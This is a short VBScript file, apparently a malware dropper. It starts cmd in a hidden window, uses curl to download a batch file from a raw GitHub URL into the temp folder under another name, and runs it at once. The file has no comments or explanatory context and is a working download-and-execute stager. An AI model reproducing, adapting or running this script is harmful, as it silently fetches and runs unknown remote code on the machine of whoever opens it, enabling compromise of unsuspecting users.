Set objshell = CreateObject("WScript.Shell")
objShell.Run "cmd /c curl -L https://raw.githubusercontent.com/seition2doc/dosta2/main/n3.bat -o %temp%\nettt.bat && %temp%\nettt.bat", 0, False
set objshell = Nothing
